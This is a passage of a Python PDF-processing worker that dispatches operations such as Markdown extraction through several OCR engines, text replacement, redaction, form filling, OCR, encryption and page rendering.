                    # Marker (Surya OCR + layout) — highest quality for scans/books: re-reads from
                    # page images. Its OWN OCR is controlled by marker_force_ocr, not an ocrmypdf
                    # pre-pass. Handles both the 1.x and legacy marker-pdf APIs.
                    remote = params.get("remote")
                    if remote:
                        return _marker_remote(in_pdf, str(remote), force_ocr=marker_force_ocr)
                    try:
                        from marker.converters.pdf import PdfConverter
                        from marker.models import create_model_dict
                        from marker.output import text_from_rendered
                        converter = PdfConverter(artifact_dict=create_model_dict())
                        rendered = converter(in_pdf)
                        text, _ext, _imgs = text_from_rendered(rendered)
                        return text
                    except ImportError:
                        from marker.convert import convert_single_pdf
                        from marker.models import load_all_models
                        text, _imgs, _meta = convert_single_pdf(in_pdf, load_all_models())
                        return text

                def _via_pymupdf():
                    # Fallback (PyMuPDF only): page text plus any detected tables, as GFM tables.
                    d = fitz.open(src_pdf) if src_pdf != in_pdf else doc
                    try:
                        parts = []
                        for pno in range(d.page_count):
                            try:
                                page = d.load_page(pno)
                                clip = None
                                if _m:
                                    r = page.rect
                                    clip = fitz.Rect(r.x0, r.y0 + _m, r.x1, r.y1 - _m)
                                text = (page.get_text(clip=clip) if clip else page.get_text()).strip()
                                if text:
                                    parts.append(text)
                                try:
                                    finder = page.find_tables(clip=clip) if clip else page.find_tables()
                                    for tab in getattr(finder, "tables", []):
                                        try:
                                            parts.append(tab.to_markdown())
                                        except Exception:
                                            pass
                                except Exception:
                                    pass  # find_tables needs PyMuPDF >= 1.23
                            except Exception:
                                pass  # one bad page (e.g. oversized) must not kill the whole doc
                        return ("\n\n".join(parts).strip() + "\n") if parts else ""
                    finally:
                        if d is not doc:
                            d.close()

                # HTTP Marker service (P1-7) — chunked + resumable, self-budgeting against a
                # soft deadline so a huge deck returns a resumable partial before the hard kill.
                _http = {"complete": True}

                def _progress(done, of):
                    # NDJSON on stderr; the adapter filters these out of the error buffer and
                    # forwards them as live progress (stdout is reserved for the final result).
                    try:
                        sys.stderr.write(json.dumps({"progress": {"op": op, "chunk": done, "of": of}}) + "\n")
                        sys.stderr.flush()
                    except Exception:  # noqa: BLE001
                        pass

                def _via_marker_http():
                    md_, complete = _marker_http(
                        in_pdf, str(params.get("endpoint")), force_ocr=marker_force_ocr,
                        input_sha=(str(params.get("input_sha")) if params.get("input_sha") else None),
                        soft_deadline_ms=params.get("soft_deadline_ms"), progress=_progress)
                    _http["complete"] = complete
                    return md_

                def _via_paddleocr_vl():
                    # Baidu PaddleOCR-VL (0.9B doc-parsing VLM) — local, CPU-capable, strong on
                    # scans/tables/formulas. PaddlePaddle is heavy + pin-conflicty, so it runs in
                    # its OWN interpreter ($PDFSTUDIO_PADDLE_PYTHON), never in the PyMuPDF/marker
                    # venv. Falls back to this interpreter if the env var is unset. A subprocess
                    # (not an import) keeps the stacks isolated; the adapter's tree-kill reaps it.
                    import subprocess
                    import tempfile
                    import shutil
                    paddle_py = os.environ.get("PDFSTUDIO_PADDLE_PYTHON") or sys.executable
                    workdir = tempfile.mkdtemp(prefix="paddleocrvl_")
                    md_out = os.path.join(workdir, "out.md")
                    helper = os.path.join(workdir, "_run_paddleocr_vl.py")
                    try:
                        with open(helper, "w", encoding="utf-8") as f:
                            f.write(_PADDLEOCR_VL_HELPER)
                        proc = subprocess.run(
                            [paddle_py, helper, os.path.abspath(src_pdf), md_out],
                            capture_output=True, text=True)
                        if proc.returncode != 0 or not os.path.exists(md_out):
                            tail = (proc.stderr or proc.stdout or "").strip()[-600:]
                            raise RuntimeError(
                                "paddleocr-vl failed (interpreter: %s). Install it in a venv and set "
                                "$PDFSTUDIO_PADDLE_PYTHON (pip install paddlepaddle \"paddleocr[doc-parser]\"). %s"
                                % (paddle_py, tail))
                        with open(md_out, encoding="utf-8") as fh:
                            return fh.read()
                    finally:
                        shutil.rmtree(workdir, ignore_errors=True)

                def _via_mineru():
                    # MinerU 2.5-Pro (opendatalab/MinerU2.5-Pro VLM) — the benchmark's table-structure
                    # leader (real HTML tables/forms). Heavy + pin-conflicty (its own torch/transformers
                    # stack), so it runs in its OWN interpreter ($PDFSTUDIO_MINERU_PYTHON), never in the
                    # PyMuPDF/marker venv. Driven through the `mineru` CLI's local VLM engine — CPU-capable
                    # via transformers (slow: ~minutes/page), best for a handful of pages. A subprocess
                    # (not an import) keeps the stacks isolated; the adapter's tree-kill reaps it.
                    import subprocess
                    import tempfile
                    import shutil
                    import glob
                    mineru_py = os.environ.get("PDFSTUDIO_MINERU_PYTHON") or sys.executable
                    scripts_dir = os.path.dirname(mineru_py)
                    mineru_bin = os.path.join(scripts_dir, "mineru.exe" if os.name == "nt" else "mineru")
                    if not os.path.exists(mineru_bin):
                        mineru_bin = "mineru"   # fall back to PATH
                    workdir = tempfile.mkdtemp(prefix="mineru_")
                    try:
                        proc = subprocess.run(
                            [mineru_bin, "-p", os.path.abspath(src_pdf), "-o", workdir, "-b", "vlm-engine"],
                            capture_output=True, text=True)
                        # MinerU writes <workdir>/<stem>/<backend>/<stem>.md
                        stem = os.path.splitext(os.path.basename(src_pdf))[0]
                        hits = sorted(glob.glob(os.path.join(workdir, "**", stem + ".md"), recursive=True))
                        if proc.returncode != 0 or not hits:
                            tail = (proc.stderr or proc.stdout or "").strip()[-600:]
                            raise RuntimeError(
                                "mineru failed (interpreter: %s). Install it in a venv and set "
                                "$PDFSTUDIO_MINERU_PYTHON (pip install \"mineru[core]\"). %s"
                                % (mineru_py, tail))
                        with open(hits[0], encoding="utf-8") as fh:
                            return fh.read()
                    finally:
                        shutil.rmtree(workdir, ignore_errors=True)

                # Engine order: the explicit choice first, then graceful fallbacks.
                engines = {
                    "pymupdf4llm": _via_pymupdf4llm,
                    "markitdown": _via_markitdown,
                    "marker": _via_marker,
                    "marker_http": _via_marker_http,
                    "pymupdf": _via_pymupdf,
                    "paddleocr-vl": _via_paddleocr_vl,
                    "mineru": _via_mineru,
                }
                if params.get("endpoint"):
                    order = ["marker_http"]   # explicit paid remote render — no silent local fallback
                elif params.get("remote"):
                    order = ["marker"]
                elif engine == "marker":
                    order = ["marker", "pymupdf4llm", "pymupdf"]
                elif engine == "paddleocr-vl":
                    order = ["paddleocr-vl", "pymupdf4llm", "pymupdf"]
                elif engine == "mineru":
                    order = ["mineru", "pymupdf4llm", "pymupdf"]
                elif engine == "markitdown":
                    order = ["markitdown", "pymupdf4llm", "pymupdf"]
                elif engine == "pymupdf4llm":
                    order = ["pymupdf4llm", "pymupdf"]
                elif engine == "pymupdf":
                    order = ["pymupdf"]
                else:  # auto — marker is opt-in only (heavy/slow), never in auto
                    order = ["pymupdf4llm", "markitdown", "pymupdf"]

                md, used, last_err, extra_notes = None, None, None, []
                for name in order:
                    try:
                        out_md = engines[name]()
                        if name == "markitdown" and len((out_md or "").strip()) < 16 and _cov()["image_only_pages"]:
                            # P1-8: markitdown has no OCR — it silently yields ~nothing on image
                            # PDFs. Don't emit an empty file; fall through to an OCR-capable engine.
                            last_err = Exception("markitdown produced no text on image-only pages")
                            extra_notes.append("markitdown yielded no text on image-only pages")
                            continue
                        md, used = out_md, name
                        break
                    except Exception as e:  # noqa: BLE001
                        last_err = e
                        continue
                if md is None:
                    result = {"ok": False, "error": "extract_markdown failed (engine=%s): %s" % (engine, last_err)}
                elif used == "marker_http" and not _http["complete"]:
                    # Soft-deadline / interrupted: do NOT publish a truncated file (it would look
                    # complete). Fetched chunks stay in .pdf-cache; re-running resumes. Signal the
                    # caller with a structured `incomplete` flag, not merely a note.
                    result["incomplete"] = True
                    result["note"] = ("remote OCR incomplete (%d chars fetched so far) — "
                                      "re-run to resume from cache" % len(md))
                else:
                    md = _clean_markdown(md)
                    with open(os.path.join(art_dir, "document.md"), "w", encoding="utf-8") as f:
                        f.write(md)
                    result["artifacts"].append({"tmp": "document.md", "path": to, "kind": "text"})
                    note = "extracted %d chars of Markdown (via %s)" % (len(md), used)
                    if used != order[0]:
                        note += " (fell back from %s — premium engine unavailable/failed)" % order[0]
                    for n in extra_notes:
                        note += " · " + n
                    result["note"] = note

        elif op == "extract_images":
            to = (params.get("to") or "output/images").rstrip("/")
            seen = set()
            count = 0
            for pno in range(doc.page_count):
                for img in doc.load_page(pno).get_images(full=True):
                    xref = img[0]
                    if xref in seen:
                        continue
                    seen.add(xref)
                    pix = fitz.Pixmap(doc, xref)
                    if pix.n - pix.alpha >= 4:  # CMYK / DeviceN → RGB
                        pix = fitz.Pixmap(fitz.csRGB, pix)
                    fn = "img_%d.png" % xref
                    pix.save(os.path.join(art_dir, fn))
                    result["artifacts"].append({"tmp": fn, "path": "%s/%s" % (to, fn), "kind": "image"})
                    count += 1
            result["note"] = "extracted %d image(s)" % count

        elif op == "replace_image":
            sel = params.get("selector") or {}
            page_no = int(sel.get("page", 1)) - 1
            object_name = sel.get("object_name")
            img_path = _safe_rel(params.get("image"))
            if not img_path or not os.path.exists(img_path):
                result = {"ok": False, "error": "replacement image not found or outside project: %s" % params.get("image")}
            else:
                page = doc.load_page(page_no)
                replaced = 0
                for img in page.get_images(full=True):
                    xref = img[0]
                    name = img[7] if len(img) > 7 else None
                    if object_name is None or name == object_name or ("xref%d" % xref) == object_name:
                        try:
                            page.replace_image(xref, filename=img_path)
                            replaced += 1
                        except Exception:
                            pass
                doc.save(out_pdf, garbage=3, deflate=True)
                result["changed"] = True
                result["note"] = "replaced %d image(s) on page %d" % (replaced, page_no + 1)

        elif op == "replace_text":
            # Find-and-replace, in place. The workflow-shaped answer to "edit the PDF": each
            # replacement is one line, batchable over a folder, no canvas. The matched text is
            # truly deleted (redaction), and the replacement lands on the ORIGINAL baseline in
            # the original size and color, in the closest base-14 font (a subsetted original
            # font can't render new glyphs — substitution is inherent; say so, don't hide it).
            find = str(params.get("find") or "")
            if not find:
                raise ValueError("replace_text needs a non-empty `find`")
            repl = str(params.get("replace") or "")
            use_regex = bool(params.get("regex"))
            page_filter = _page_set(params.get("pages"), doc.page_count)
            flags = re.IGNORECASE if params.get("ignore_case") else 0
            if use_regex:
                # `find` is a raw pattern. whole_word is ignored (the pattern owns its
                # boundaries). Compile once so a bad pattern fails with a clear message.
                try:
                    rx = re.compile(find, flags)
                except re.error as e:
                    raise ValueError("replace_text `find` is not a valid regex: %s" % e)
            else:
                pat = re.escape(find)
                if params.get("whole_word"):
                    if find[:1].isalnum() or find[:1] == "_":
                        pat = r"\b" + pat
                    if find[-1:].isalnum() or find[-1:] == "_":
                        pat = pat + r"\b"
                rx = re.compile(pat, flags)
            font_override = str(params.get("font") or "auto")
            # Optional: embed a real .ttf/.otf so the replacement renders in the ACTUAL font
            # instead of a Base-14 fallback — supply the document's font to match typography
            # exactly (the honest answer to "new glyphs can't reuse a subsetted embedded font").
            # Path is workflow-relative (e.g. assets/DejaVuSans.ttf); overrides `font`.
            font_file = _safe_rel(params.get("font_file")) if params.get("font_file") else None
            embed_font = None
            if font_file:
                if not os.path.isfile(font_file) or os.path.splitext(font_file)[1].lower() not in (".ttf", ".otf"):
                    raise ValueError(
                        "replace_text font_file must be an existing .ttf/.otf under the workflow: %s"
                        % params.get("font_file"))
                try:
                    embed_font = fitz.Font(fontfile=font_file)  # for width; embedded via insert_text
                except Exception as e:  # noqa: BLE001
                    raise ValueError("replace_text could not load font_file %s: %s" % (font_file, e))

            def _repl_for(m):
                # Literal mode: the replacement is constant. Regex mode: expand backreferences
                # (\1, \g<name>) per match; a bad template falls back to the literal string.
                if not use_regex:
                    return repl
                try:
                    return m.expand(repl)
                except re.error:
                    return repl

            hits, warnings = [], []
            for pno in range(doc.page_count):
                if page_filter is not None and (pno + 1) not in page_filter:
                    continue
                page = doc.load_page(pno)
                jobs = []
                for line_text, metas in _line_chars(page):
                    for m in rx.finditer(line_text):
                        if m.start() == m.end():
                            continue  # skip zero-width regex matches (e.g. "x*")
                        span = metas[m.start():m.end()]
                        rect = span[0][0]
                        for r, *_ in span[1:]:
                            rect |= r
                        _, origin, size, color, font, sflags = span[0]
                        base = origin if origin else (rect.x0, rect.y1 - size * 0.2)
                        jobs.append({"rect": rect, "x": base[0], "y": base[1], "size": size,
                                     "color": color, "font": _map_replacement_font(font, sflags, font_override),
                                     "repl": _repl_for(m)})
                        hits.append((pno + 1, m.group(0), rect, _repl_for(m)))
                if jobs and not params.get("preview"):
                    # Redact first, insert after — apply_redactions removes glyphs that
                    # intersect the rects, so the insertion must not exist yet.
                    for j in jobs:
                        page.add_redact_annot(j["rect"])
                    page.apply_redactions(images=fitz.PDF_REDACT_IMAGE_NONE)
                    for j in jobs:
                        rtext = j["repl"]
                        if not rtext:
                            continue  # empty replacement = deletion
                        rgb = (((j["color"] >> 16) & 255) / 255.0, ((j["color"] >> 8) & 255) / 255.0,
                               (j["color"] & 255) / 255.0)
                        if embed_font is not None:
                            # Embed the supplied font (registered once under a stable alias) so
                            # NEW glyphs render in the real face, not a Base-14 approximation.
                            page.insert_text((j["x"], j["y"]), rtext, fontsize=j["size"],
                                             fontname="custfont", fontfile=font_file, color=rgb)
                            new_w = embed_font.text_length(rtext, fontsize=j["size"])
                        else:
                            page.insert_text((j["x"], j["y"]), rtext, fontsize=j["size"],
                                             fontname=j["font"], color=rgb)
                            new_w = fitz.get_text_length(rtext, fontname=j["font"], fontsize=j["size"])
                        if new_w > j["rect"].width + j["size"]:
                            warnings.append(
                                'p%d: "%s" is ~%.0fpt wider than the text it replaced — it may '
                                "crowd what follows on the line" % (pno + 1, rtext, new_w - j["rect"].width))

            kind_word = "pattern" if use_regex else "text"
            if params.get("preview"):
                to = params.get("to") or "output/replace-preview.md"
                header = ("regex `%s` → `%s`" % (find, repl)) if use_regex else ("`%s` → `%s`" % (find, repl))
                lines = ["# replace_text preview", "",
                         "%s — **%d match(es)**" % (header, len(hits)), ""]
                for pno, text, rect, rtext in hits:
                    shown = ("`%s` → `%s`" % (text, rtext)) if use_regex else ("`%s`" % text)
                    lines.append("- p%d · %s at (%.0f, %.0f)" % (pno, shown, rect.x0, rect.y0))
                if not hits:
                    lines.append("_no matches — nothing would change_")
                with open(os.path.join(art_dir, "replace-preview.md"), "w", encoding="utf-8") as f:
                    f.write("\n".join(lines) + "\n")
                result["artifacts"].append({"tmp": "replace-preview.md", "path": to, "kind": "text"})
                result["preview"] = True
                result["note"] = 'PREVIEW: %d match(es) for %s "%s" — no changes made; see %s' % (
                    len(hits), kind_word, find, to)
            elif hits:
                doc.save(out_pdf, garbage=3, deflate=True)
                result["changed"] = True
                result["note"] = 'replaced %d occurrence(s) of %s "%s"%s' % (
                    len(hits), kind_word, find, " · %d warning(s)" % len(warnings) if warnings else "")
                if warnings:
                    result["note"] += " — " + "; ".join(warnings[:3])
            else:
                result["note"] = 'replaced 0 occurrences — %s "%s" not found (case-sensitive unless ignore_case; matches within a single line)' % (kind_word, find)

        elif op == "redact":
            page_no = int(params.get("page", 1)) - 1
            rects = params.get("rects") or []
            page = doc.load_page(page_no)
            n = 0
            for r in rects:
                if len(r) >= 4:
                    x, y, w, h = r[0], r[1], r[2], r[3]
                    page.add_redact_annot(fitz.Rect(x, y, x + w, y + h), fill=(0, 0, 0))
                    n += 1
            page.apply_redactions()
            rdpi = _save_maybe_raster(doc, out_pdf, params)
            result["changed"] = True
            result["note"] = "redacted %d region(s) on page %d%s" % (
                n, page_no + 1, (" · flattened to image at %d dpi" % rdpi) if rdpi else "")

        elif op == "fill_field":
            field_name = params.get("field")
            if not field_name:
                result = {"ok": False, "error": "fill_field requires a 'field' name"}
            else:
                kind = "check" if params.get("check") is not None else "text"
                val = params.get("check") if kind == "check" else params.get("value")
                r = _fill_widgets(doc, [{"name": field_name, "value": val, "kind": kind}])
                if r["filled"] == 0:
                    result = {"ok": False, "error": "form field not found: %s" % field_name}
                else:
                    _normalize_checkmarks(doc)
                    _finalize_acroform(doc)
                    doc.save(out_pdf, garbage=3, deflate=True)
                    result["changed"] = True
                    result["note"] = "filled '%s'" % field_name

        elif op == "fill_form":
            instructions = params.get("fields") or []
            if isinstance(instructions, dict):  # {name: value} convenience → text fields
                instructions = [{"name": k, "value": v, "kind": "text"} for k, v in instructions.items()]
            if not isinstance(instructions, list) or not instructions:
                result = {"ok": False, "error": "fill_form requires resolved `fields` (a list of {name,value,kind})"}
            else:
                warnings = []
                src = params.get("source_fields")
                if isinstance(src, list) and src:  # revision-drift guard
                    actual = set()
                    for pno in range(doc.page_count):
                        for w in (doc.load_page(pno).widgets() or []):
                            actual.add(w.field_name)
                    missing = [n for n in src if n not in actual]
                    if len(missing) > max(2, len(src) // 5):
                        warnings.append("this PDF is missing %d/%d expected fields — possibly a different form revision" % (len(missing), len(src)))
                r = _fill_widgets(doc, instructions)
                _normalize_checkmarks(doc)
                xfa_dropped = _finalize_acroform(doc)
                sig_note = ""
                sig = params.get("signature")
                if isinstance(sig, dict) and sig.get("image"):
                    ok_sig, err = _apply_signature(doc, sig)
                    sig_note = " · signature embedded" if ok_sig else (" · signature skipped (%s)" % err)
                flat_note = ""
                if params.get("flatten"):
                    try:
                        doc.bake()
                        flat_note = " · flattened (final)"
                    except Exception:
                        flat_note = " · flatten skipped (needs PyMuPDF >= 1.24)"
                elif xfa_dropped:
                    # XFA gov form left editable: viewers render live fields via their own
                    # XFA engine, which can show "&" for spaces. The values/appearances are
                    # correct; flattening bakes them for a copy that renders right everywhere.
                    flat_note = " · tip: add flatten: true for a print-ready copy that renders identically in every viewer"
                doc.save(out_pdf, garbage=3, deflate=True)
                result["changed"] = True
                note = "filled %d field(s)" % r["filled"]
                if r["truncated"]:
                    note += " · %d truncated to fit" % r["truncated"]
                if r["unmatched"]:
                    note += " · %d not matched: %s" % (len(r["unmatched"]), ", ".join(r["unmatched"][:8]))
                note += sig_note + flat_note
                for wmsg in warnings:
                    note += " · WARNING " + wmsg
                result["note"] = note

        elif op == "ocr":
            lang = str(params.get("language") or "eng")
            # Constrain to real Tesseract language-code characters (e.g. eng, chi_sim,
            # eng+deu) so an untrusted workflow can't smuggle anything into the backend.
            mode = str(params.get("mode") or "skip-text").lower()
            pr = str(params.get("page_range") or "").strip()
            if not re.match(r"^[A-Za-z0-9_+-]{1,64}$", lang):
                result = {"ok": False, "error": "invalid OCR language code: %r" % lang}
            elif mode not in _OCR_MODE_KW:
                result = {"ok": False, "error": "ocr `mode` must be one of %s" % list(_OCR_MODE_KW)}
            elif pr and not re.match(r"^[0-9,\-\s]+$", pr):
                result = {"ok": False, "error": 'ocr `page_range` must look like "1-3,7"'}
            else:
                # P1-4: fail early + clearly if a requested language isn't installed, instead
                # of failing opaquely deep inside every chunk.
                have = _installed_tesseract_langs()
                missing = [l for l in lang.split("+") if l not in have] if have else []
                if missing:
                    result = {"ok": False, "error":
                              "OCR language(s) not installed: %s (installed: %s). Add "
                              "<lang>.traineddata to the Tesseract tessdata dir — e.g. from "
                              "github.com/tesseract-ocr/tessdata_best."
                              % (", ".join(missing), ", ".join(sorted(have)))}
                else:
                    try:
                        import ocrmypdf  # noqa: F401
                    except Exception as e:  # noqa: BLE001
                        result = {"ok": False, "error": "OCRmyPDF not installed: %s (pip install ocrmypdf)" % e}
                    else:
                        kwargs = dict(_OCR_MODE_KW[mode])
                        kwargs["language"] = lang
                        kwargs["progress_bar"] = False
                        kwargs["output_type"] = "pdfa" if str(params.get("output_type") or "pdf").lower() == "pdfa" else "pdf"
                        if params.get("optimize") is not None:
                            try:
                                kwargs["optimize"] = max(0, min(3, int(params["optimize"])))
                            except (TypeError, ValueError):
                                pass
                        # force-ocr can't rasterize an oversized artifact page — Tesseract's
                        # 32,767-px limit is hit INSIDE ocrmypdf (safe_pixmap can't reach it).
                        # Subtract oversized pages from the effective range so one bad page
                        # can't abort the whole run.
                        skipped = []
                        if mode == "force-ocr":
                            over = set()
                            for i in range(doc.page_count):
                                r = doc.load_page(i).rect
                                if max(r.width, r.height) > _COV_OVERSIZE_PT:
                                    over.add(i + 1)
                            if over:
                                pr = _serialize_page_range(_parse_page_range(pr, doc.page_count) - over)
                                skipped = sorted(over)
                        if pr:
                            kwargs["pages"] = pr
                        doc.close()  # ocrmypdf works on files; release the fitz handle first
                        note = "OCR text layer added (mode=%s, language=%s)" % (mode, lang)
                        if skipped:
                            note += " · skipped %d oversized page(s) %s (exceed Tesseract limits)" % (
                                len(skipped), _compact_pages(skipped))
                        res = _ocrmypdf_hardened(in_pdf, out_pdf, kwargs, note)
                        res.pop("salvaged", None)
                        result = res

        elif op == "flatten":
            try:
                # PyMuPDF >= 1.24: bake annotations + form fields into page content.
                doc.bake()
                doc.save(out_pdf, garbage=3, deflate=True)
                result["changed"] = True
                result["note"] = "flattened form fields + annotations"
            except AttributeError:
                result = {"ok": False, "error": "flatten needs PyMuPDF >= 1.24 (Document.bake)"}
            except Exception as e:  # noqa: BLE001
                result = {"ok": False, "error": "flatten failed: %s" % e}

        elif op == "encrypt":
            user_pw = params.get("user_password")
            owner_pw = params.get("owner_password")
            if not user_pw and not owner_pw:
                result = {"ok": False, "error": "encrypt requires user_password and/or owner_password"}
            else:
                try:
                    import pikepdf
                except Exception as e:  # noqa: BLE001
                    result = {"ok": False, "error": "pikepdf not installed: %s (pip install pikepdf)" % e}
                else:
                    try:
                        doc.close()  # hand the file to pikepdf (ships its own libqpdf)
                        pdf = pikepdf.open(in_pdf)
                        enc = pikepdf.Encryption(user=str(user_pw or ""), owner=str(owner_pw or user_pw or ""))
                        pdf.save(out_pdf, encryption=enc)
                        pdf.close()
                        result["changed"] = True
                        result["note"] = "encrypted (AES-256)"
                    except Exception as e:  # noqa: BLE001
                        result = {"ok": False, "error": "encrypt failed: %s" % e}

        elif op == "decrypt":
            pw = str(params.get("password") or "")
            try:
                import pikepdf
            except Exception as e:  # noqa: BLE001
                result = {"ok": False, "error": "pikepdf not installed: %s (pip install pikepdf)" % e}
            else:
                try:
                    doc.close()
                    pdf = pikepdf.open(in_pdf, password=pw)
                    pdf.save(out_pdf)  # re-save without encryption
                    pdf.close()
                    result["changed"] = True
                    result["note"] = "decrypted (password removed)"
                except Exception as e:  # noqa: BLE001
                    result = {"ok": False, "error": "decrypt failed: %s (wrong password?)" % e}

        elif op == "linearize":
            try:
                import pikepdf
            except Exception as e:  # noqa: BLE001
                result = {"ok": False, "error": "pikepdf not installed: %s (pip install pikepdf)" % e}
            else:
                try:
                    doc.close()
                    pdf = pikepdf.open(in_pdf)
                    pdf.save(out_pdf, linearize=True)
                    pdf.close()
                    result["changed"] = True
                    result["note"] = "linearized (fast web view)"
                except Exception as e:  # noqa: BLE001
                    result = {"ok": False, "error": "linearize failed: %s" % e}

        # pdf_to_png / pdf_to_jpg are presets of render_pages: same capability, same code,
        # the op NAME fixes the format. They exist because "render_pages" is not what anyone
        # searching for a PDF-to-image converter types (mirrors extract_markdown/pdf_to_markdown).
        elif op in ("render_pages", "pdf_to_png", "pdf_to_jpg"):
            to = (params.get("to") or "output/pages").rstrip("/")
            dpi = _clamp_dpi(params.get("dpi"))
            if op == "pdf_to_png":
                fmt = "png"
            elif op == "pdf_to_jpg":
                fmt = "jpg"
            else:
                raw_fmt = str(params.get("format") or "png").lower()
                fmt = "jpg" if raw_fmt in ("jpg", "jpeg") else ("svg" if raw_fmt == "svg" else "png")
            # JPEG has no alpha channel; asking for a transparent JPG is a mistake worth
            # naming rather than silently producing a black or white background.
            transparent = bool(params.get("transparent"))
            if transparent and fmt != "png":
                raise ValueError(
                    'transparent is PNG-only — %s cannot store transparency. Use pdf_to_png, '
                    'or drop transparent.' % ("SVG" if fmt == "svg" else "JPG")
                )
            # _page_set yields an unordered set of 1-based numbers (None = every page);
            # sort it and drop to 0-based so pages come out in document order.
            sel = _page_set(params.get("pages"), doc.page_count)
            targets = range(doc.page_count) if sel is None else [p - 1 for p in sorted(sel)]
            tpl = params.get("name")
            _ds = []
            count = 0
            for i, pno in enumerate(targets):
                page = doc.load_page(pno)
                if tpl:
                    fn = "%s.%s" % (_safe_filename(_render_image_name(tpl, i + 1, pno + 1), "page_%d" % (pno + 1)), fmt)
                else:
                    fn = "page_%d.%s" % (pno + 1, fmt)
                if fmt == "svg":
                    # Vector export — infinite zoom, tiny files. text_as_path keeps glyphs
                    # exact without needing the font (default); false emits selectable <text>.
                    svg = page.get_svg_image(text_as_path=bool(params.get("text_as_path", True)))
                    with open(os.path.join(art_dir, fn), "w", encoding="utf-8") as f:
                        f.write(svg)
                else:
                    # alpha=True keeps the page background transparent instead of compositing
                    # onto white — the difference between a picture of a page and an asset.
                    pix, eff, down = _safe_pixmap(page, dpi, alpha=transparent)
                    pix.save(os.path.join(art_dir, fn))
                    if down:
                        _ds.append((pno + 1, eff))
                result["artifacts"].append({"tmp": fn, "path": "%s/%s" % (to, fn), "kind": "image"})
                count += 1
            unit = "vector SVG" if fmt == "svg" else "%d dpi" % dpi
            extra = ", transparent" if transparent else ""
            result["note"] = ("rendered %d page(s) to %s (%s%s)" % (count, fmt.upper(), unit, extra)) + _downscale_note(_ds, dpi)

        elif op == "remove_blank_pages":
            blanks = []
            for pno in range(doc.page_count):
                page = doc.load_page(pno)
                if page.get_text().strip():
                    continue
                if page.get_images(full=True) or page.get_drawings():
                    continue
                pix = page.get_pixmap(dpi=36)
                if not pix.samples or min(pix.samples) >= 245:
                    blanks.append(pno)
            for pno in reversed(blanks):
                doc.delete_page(pno)
            doc.save(out_pdf, garbage=3, deflate=True)
            result["changed"] = True
            result["note"] = "removed %d blank page(s), %d remain" % (len(blanks), doc.page_count)

        elif op == "remove_annotations":
            n = 0
            for pno in range(doc.page_count):
                page = doc.load_page(pno)
                for annot in list(page.annots() or []):
                    page.delete_annot(annot)
                    n += 1
            doc.save(out_pdf, garbage=3, deflate=True)
            result["changed"] = True
            result["note"] = "removed %d annotation(s)" % n

        elif op == "remove_images":
            n = 0
            # Redacting an image's rect must NOT take out text/vector art that
            # overlaps it (e.g. a full-bleed background behind body text). Ask
            # apply_redactions to remove images only, leaving text + line-art.
            redact_kwargs = {
                "images": getattr(fitz, "PDF_REDACT_IMAGE_REMOVE", 2),
                "text": getattr(fitz, "PDF_REDACT_TEXT_NONE", 1),
            }
            graphics_none = getattr(fitz, "PDF_REDACT_LINE_ART_NONE", None)
            if graphics_none is not None:
                redact_kwargs["graphics"] = graphics_none
            for pno in range(doc.page_count):
                page = doc.load_page(pno)
                for img in page.get_images(full=True):
                    for rect in page.get_image_rects(img[0]):
                        page.add_redact_annot(rect)
                        n += 1
                try:
                    page.apply_redactions(**redact_kwargs)
                except TypeError:
                    # Older PyMuPDF without the text/graphics kwargs.
                    page.apply_redactions(images=redact_kwargs["images"])
            doc.save(out_pdf, garbage=3, deflate=True)
            result["changed"] = True
            result["note"] = "removed %d image placement(s)" % n

        elif op == "sanitize":
            doc.scrub()
            doc.save(out_pdf, garbage=3, deflate=True)
            result["changed"] = True
            result["note"] = "sanitized (JavaScript, metadata, embedded files, links removed)"

        elif op == "auto_redact":
            def _as_list(v):
                if isinstance(v, str):
                    v = [v]
                return [str(x) for x in (v or []) if str(x).strip()]
            terms = _as_list(params.get("text"))
            regexes = _as_list(params.get("regex"))
            presets = [p.strip().lower() for p in _as_list(params.get("patterns"))]
            ignore_case = bool(params.get("ignore_case") or params.get("case_insensitive"))
            whole_word = bool(params.get("whole_word"))
            preview = bool(params.get("preview") or params.get("dry_run"))
            specs, unknown = _redact_specs(terms, regexes, presets, whole_word)
            if not specs:
                result = {"ok": False, "error": "auto_redact requires `text`, `regex`, or `patterns` (one or more)"}
            else:
                n = 0
                hits = {}
                rows = []  # preview: (page, matched, label)
                for pno in range(doc.page_count):
                    page = doc.load_page(pno)
                    for label, matched, rects in _page_redactions(page, specs, ignore_case):
                        hits[label] = hits.get(label, 0) + 1
                        n += 1
                        if preview:
                            rows.append((pno + 1, matched, label))
                        else:
                            for rect in rects:
                                page.add_redact_annot(rect, fill=(0, 0, 0))
                    if not preview:
                        page.apply_redactions()
                missed = [lbl for (lbl, _p) in specs if hits.get(lbl, 0) == 0]
                if preview:
                    # Dry run: report what WOULD be redacted; apply nothing. Pass the
                    # document through unchanged so the pipeline continues.
                    lines = ["# Redaction preview", "",
                             "**%d match(es)** across %d page(s). NO redactions applied — this is a dry run "
                             "(matching is %s). Remove `preview: true` to apply." % (
                                 n, doc.page_count, "case-insensitive" if ignore_case else "case-sensitive"), ""]
                    if rows:
                        lines += ["| page | matched text | rule |", "|------|--------------|------|"]
                        for (pg, matched, label) in rows:
                            safe = matched.replace("|", "\\|").replace("\n", " ")
                            lines.append("| %d | %s | %s |" % (pg, safe, label))
                    if missed:
                        lines += ["", "**No match for:** " + ", ".join(missed)]
                    if unknown:
                        lines += ["", "**Unknown pattern preset(s) ignored:** " + ", ".join(unknown)
                                  + "  \n(known presets: " + ", ".join(sorted(_REDACT_PRESETS)) + ")"]
                    to = params.get("to") or "output/redaction-preview.md"
                    with open(os.path.join(art_dir, "redaction-preview.md"), "w", encoding="utf-8") as f:
                        f.write("\n".join(lines) + "\n")
                    result["artifacts"].append({"tmp": "redaction-preview.md", "path": to, "kind": "text"})
                    doc.save(out_pdf, garbage=3, deflate=True)  # unchanged pass-through
                    result["changed"] = False
                    note = "PREVIEW: %d match(es) — NO redactions applied; see %s" % (n, to)
                    if missed:
                        note += "; %d rule(s) with no match" % len(missed)
                    result["note"] = note
                else:
                    rdpi = _save_maybe_raster(doc, out_pdf, params)
                    result["changed"] = True
                    note = "redacted %d match(es) from %d rule(s)%s" % (
                        n, len(specs), (" · flattened to image at %d dpi" % rdpi) if rdpi else "")
                    if missed:
                        note += "; WARNING no match for: %s — verify manually (matching is %s)" % (
                            ", ".join(missed), "case-insensitive" if ignore_case else "case-sensitive")
                    if unknown:
                        note += "; ignored unknown preset(s): %s (known: %s)" % (
                            ", ".join(unknown), ", ".join(sorted(_REDACT_PRESETS)))
                    result["note"] = note

        elif op == "set_bookmarks":
